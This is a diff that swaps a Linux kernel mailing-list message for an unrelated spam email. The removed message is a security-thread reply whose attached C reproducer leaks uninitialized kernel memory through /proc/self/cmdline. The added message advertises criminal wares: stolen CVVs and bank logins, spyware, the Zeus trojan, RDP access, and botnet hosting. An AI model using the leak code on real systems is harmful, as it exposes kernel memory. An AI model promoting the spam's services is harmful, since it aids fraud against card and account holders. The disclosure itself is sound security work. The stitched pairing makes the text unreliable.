@@ -2,157 +2,106 @@ Return-Path: <linux-fsdevel-owner@vger.kernel.org>
 X-Original-To: lists+linux-fsdevel@lfdr.de
 Delivered-To: lists+linux-fsdevel@lfdr.de
 Received: from vger.kernel.org (vger.kernel.org [209.132.180.67])
-	by mail.lfdr.de (Postfix) with ESMTP id 422C767A62
-	for <lists+linux-fsdevel@lfdr.de>; Sat, 13 Jul 2019 16:09:47 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTP id A3A2867B21
+	for <lists+linux-fsdevel@lfdr.de>; Sat, 13 Jul 2019 17:59:33 +0200 (CEST)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S1727656AbfGMOJa (ORCPT <rfc822;lists+linux-fsdevel@lfdr.de>);
-        Sat, 13 Jul 2019 10:09:30 -0400
-Received: from bran.ispras.ru ([83.149.199.196]:31577 "EHLO smtp.ispras.ru"
-        rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with ESMTP
-        id S1727504AbfGMOJ3 (ORCPT <rfc822;linux-fsdevel@vger.kernel.org>);
-        Sat, 13 Jul 2019 10:09:29 -0400
-Received: from [10.10.3.112] (starling.intra.ispras.ru [10.10.3.112])
-        by smtp.ispras.ru (Postfix) with ESMTP id 05CFE201D0;
-        Sat, 13 Jul 2019 17:09:28 +0300 (MSK)
-Subject: Re: [PATCH] proc: Fix uninitialized byte read in get_mm_cmdline()
-To:     Alexey Dobriyan <adobriyan@gmail.com>
-Cc:     Oleg Nesterov <oleg@redhat.com>, linux-kernel@vger.kernel.org,
-        linux-fsdevel@vger.kernel.org, security@kernel.org
-References: <20190712160913.17727-1-izbyshev@ispras.ru>
- <20190712163625.GF21989@redhat.com> <20190712174632.GA3175@avx2>
- <3de2d71b-37be-6238-7fd8-0a40c9b94a98@ispras.ru>
- <20190713072606.GA23167@avx2>
-From:   Alexey Izbyshev <izbyshev@ispras.ru>
-Message-ID: <2cba2f3d-4a7c-ddeb-fbd7-e2aafb728493@ispras.ru>
-Date:   Sat, 13 Jul 2019 17:09:27 +0300
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101
- Thunderbird/60.7.1
+        id S1727711AbfGMP7b (ORCPT <rfc822;lists+linux-fsdevel@lfdr.de>);
+        Sat, 13 Jul 2019 11:59:31 -0400
+Received: from 072-190-080-237.res.spectrum.com ([72.190.80.237]:39621 "EHLO
+        trixbox1.localdomain" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org
+        with ESMTP id S1727638AbfGMP7b (ORCPT
+        <rfc822;linux-fsdevel@vger.kernel.org>);
+        Sat, 13 Jul 2019 11:59:31 -0400
+X-Greylist: delayed 7120 seconds by postgrey-1.27 at vger.kernel.org; Sat, 13 Jul 2019 11:59:30 EDT
+Received: from Shop01 (trixbox1.localdomain [127.0.0.1])
+        by trixbox1.localdomain (Postfix) with SMTP id 3B55638788F4;
+        Sat, 13 Jul 2019 09:00:11 -0500 (CDT)
+Received: from [131.241.72.253] by Shop01 with SMTP; Sat, 13 Jul 2019 17:57:18 +0400
+Message-ID: <a50z$7-p4--bhw-$$1e$c4$$4@uwhcbhb>
+From:   "CYBER GATES LTD" <gameza@taekwondo.com>
+Reply-To: "CYBER GATES LTD" <gameza@taekwondo.com>
+To:     20050516132745.GA23430@frasco.org.uk
+Subject: FRESH & NEW EMAIL LEADS TOOLS, RDP,EMAILS, SPYWARES, SMTP, MAILER, CVV
+Date:   Sat, 13 Jul 19 17:57:18 GMT
+X-Mailer: Microsoft Outlook, Build 10.0.2616
 MIME-Version: 1.0
-In-Reply-To: <20190713072606.GA23167@avx2>
-Content-Type: multipart/mixed;
- boundary="------------C43CA79F4814729DBF8EE52C"
-Content-Language: en-US
+Content-Type: multipart/alternative;
+        boundary="F8.E37.A6_8ACA"
+X-Priority: 3
+X-MSMail-Priority: Normal
 Sender: linux-fsdevel-owner@vger.kernel.org
 Precedence: bulk
 List-ID: <linux-fsdevel.vger.kernel.org>
 X-Mailing-List: linux-fsdevel@vger.kernel.org
 
-This is a multi-part message in MIME format.
---------------C43CA79F4814729DBF8EE52C
-Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: 7bit
 
-On 7/13/19 10:26 AM, Alexey Dobriyan wrote:
-> On Fri, Jul 12, 2019 at 09:43:03PM +0300, Alexey Izbyshev wrote:
->> On 7/12/19 8:46 PM, Alexey Dobriyan wrote:
->>> The proper fix to all /proc/*/cmdline problems is to revert
->>>
->>> 	f5b65348fd77839b50e79bc0a5e536832ea52d8d
->>> 	proc: fix missing final NUL in get_mm_cmdline() rewrite
->>>
->>> 	5ab8271899658042fabc5ae7e6a99066a210bc0e
->>> 	fs/proc: simplify and clarify get_mm_cmdline() function
->>>
->> Should this be interpreted as an actual suggestion to revert the patches,
->> fix the conflicts, test and submit them, or is this more like thinking out
->> loud?
-> 
-> Of course! Do you have a reproducer?
-> 
-Attached.
+--F8.E37.A6_8ACA
+Content-Type: text/plain;
+Content-Transfer-Encoding: quoted-printable
 
-Alexey
+DEAR CUSTOMERS
+We are happy to inform you about our new SMTP SERVER
+today I would like to introduce you to a page that provides services for U=
+NLIMITED SENDER
+We offer all the services that you desire now? 15x Domain Inbox SMTP  
+please check  http://www.cybergatesltd.net/index.php?route=3Dproduct/produ=
+ct&product_id=3D458
 
---------------C43CA79F4814729DBF8EE52C
-Content-Type: text/x-csrc;
- name="dump-page.c"
-Content-Transfer-Encoding: 7bit
-Content-Disposition: attachment;
- filename="dump-page.c"
+    Unlimited SMTP (Cheap and Inbox)
+    Unlimited PHP Mailer (Cheap and Inbox)
+    Unlimited WebMail Sever ( Cheap And Inbox)
+    RDP With AMS 4.3 (Warranty Full Time and On Sales)
+    Email Leads (New and Fresh)
+    Unlimited Cpanel Hosting (Use For Scampage, botnet,etc...)
+    VPN
+    Linux Root
+    Hacking Tools
+    zeus trojan Hacking
+    ScamPage
+    CVV,
+    BANK LOGINS,
+    DATING SITES LOGIN
+    SPYWARES
+    ETC
 
-#include <fcntl.h>
-#include <stdint.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/mman.h>
-#include <unistd.h>
+Top Services  http://www.cybergatesltd.net
+To impress the customers, so we decided to discout  price all products wit=
+h 10% discount code: http://www.cybergatesltd.net
 
-#define PAGE_SIZE 4096
+You can see more
+Sale OFF 10% All Product
+How can I enter discount code?
+We also have 100 RDP WITH AMS program discounts to customers
+Click here to Order Now, be quick, limited    http://www.cybergatesltd.net=
+/index.php?route=3Dproduct/category&path=3D93
+Why is trusted by our customers?
+We always provide the best service for our customers, we guarantee custome=
+rs will be happy to have what they want, the first priority is to treat ou=
+r customers as god
+How to Order?
+Payment Method?
+We accept payment Via PerfectMoney
+We will try to accept multiple payment gateways to serve customers better
+Deliver
+We Delivered Via Email Within 0-2 hour
+You have any questions Other?
+Click here for see more //
+http://www.cybergatesltd.net/index.php?route=3D=
+product/category&path=3D59
+Are you ready to experience?
+READY TO GET STARTED?
+With us, you will not be disappointed, currently on the market there are m=
+any scam sites, selling quality goods, come to us, we will show you, Our s=
+ervice is best
+Customer Care Services
+Thank you for choosing cyber gates Store!
+chat with the admin for more information
+Perfect Money payments will be accepted using our LIVE CHAT payment proces=
+sor. 
 
-#define CHECK(expr) \
-  ({ \
-    long r = (expr); \
-    if (r < 0) { \
-      perror(#expr); \
-      exit(1); \
-    } \
-    r; \
-  })
+skype( skytunnel1 
+chat ( rsmtp@yahoo.com
+www.cybergatesltd.net
 
-static void dump(unsigned char *page, size_t ind) {
-    char fname[30];
-    sprintf(fname, "page%zu", ind);
-    printf("dumping %s\n", fname);
-    int fd = CHECK(open(fname, O_CREAT|O_TRUNC|O_WRONLY, 0666));
-    CHECK(write(fd, page, PAGE_SIZE));
-    close(fd);
-}
+--F8.E37.A6_8ACA--
 
-int main(int argc, char *argv[], char *envp[]) {
-    char *last_arg_nul = argv[argc - 1] + strlen(argv[argc - 1]);
-    printf("last arg end: %p\n", last_arg_nul);
-    size_t argv_size = last_arg_nul - argv[0] + 1;
-    size_t page_offset = (uintptr_t)last_arg_nul & (PAGE_SIZE - 1);
-    if (page_offset != PAGE_SIZE - 1 || argv_size < PAGE_SIZE - 1) {
-        printf("will re-exec to arrange argv\n");
-        if (page_offset != PAGE_SIZE - 1) {
-            /* Pad env block so that the last byte of arg block is also
-             * the last byte of its page. */
-            size_t env0_size = page_offset + 1 + strlen(envp[0]) + 1;
-            char *new_env = malloc(env0_size);
-            memset(new_env, 'Z', env0_size - 1);
-            new_env[env0_size - 1] = '\0';
-            envp[0] = new_env;
-        }
-        char *path = argv[0];
-        if (argv_size < PAGE_SIZE) {
-          /* Also make sure that arg block is not shorter than a page. */
-          argv[0] = (char[]){[0 ... PAGE_SIZE - 1] = 'Z', '\0'};
-        }
-        execve(path, argv, envp);
-        perror("execve");
-        return 127;
-    }
-
-    *last_arg_nul = 'Z';
-    /* Make sure the kernel can't read past arg_end. */
-    CHECK(mprotect(last_arg_nul + 1, PAGE_SIZE, PROT_NONE));
-
-    char buf[PAGE_SIZE];
-    unsigned char leaked[PAGE_SIZE] = {'U'};
-    unsigned num_good = 0;
-    int fd = CHECK(open("/proc/self/cmdline", O_RDONLY));
-    while (1) {
-        int found_good = 0;
-        for (size_t off = 1; off < PAGE_SIZE; ++off) {
-            CHECK(lseek(fd, argv_size - off, SEEK_SET));
-            ssize_t got = CHECK(read(fd, buf, sizeof buf));
-            if (got <= off) {
-                printf("no leak: kernel seems to be fixed\n");
-                return 1;
-            }
-            unsigned char leaked_byte = buf[got - 1];
-            found_good |= (leaked_byte && leaked_byte != 'Z');
-            leaked[off] = leaked_byte;
-        }
-        if (found_good)
-            dump(leaked, num_good++);
-        sleep(1);
-    }
-
-    close(fd);
-    return 0;
-}
-
---------------C43CA79F4814729DBF8EE52C--
